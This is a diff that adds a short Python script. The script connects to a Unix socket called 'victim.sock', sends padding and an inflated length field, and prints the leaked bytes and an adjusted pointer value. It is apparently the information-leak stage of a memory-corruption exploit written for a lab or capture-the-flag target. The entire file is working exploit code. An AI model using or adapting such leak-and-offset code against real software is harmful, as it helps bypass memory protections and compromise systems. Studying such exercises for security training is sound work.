@@ -1,0 +1,48 @@
+
+import socket
+import sys
+from os.path import expanduser
+
+# Create a UDS socket
+sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+
+# Connect the socket to the port where the server is listening
+home = expanduser("~")
+server_address = home + '/victim.sock'
+print('connecting to {}'.format(server_address))
+try:
+    sock.connect(server_address)
+except socket.error as msg:
+    print(msg)
+    sys.exit(1)
+
+try:
+
+    # Send data
+    message = b'AAAAAAAAAAAAAAAAAAAAAAAA\n32\n'
+    print('sending {!r}'.format(message))
+    sock.sendall(message)
+
+    amount_received = 0
+    amount_expected = len(message)
+
+    while amount_received < amount_expected:
+        data = sock.recv(32)
+        amount_received += len(data)
+        print("0x" + data.hex()[48:])
+
+    # Send data
+    message = b'\n6\n'
+    print('sending {!r}'.format(message))
+    sock.sendall(message)
+
+    amount_received = 0
+    amount_expected = len(message)
+    while amount_received < amount_expected:
+        data = sock.recv(6)
+        amount_received += len(data)
+        print(hex(int.from_bytes(data,"little")-224))
+
+finally:
+    print('closing socket')
+    sock.close()
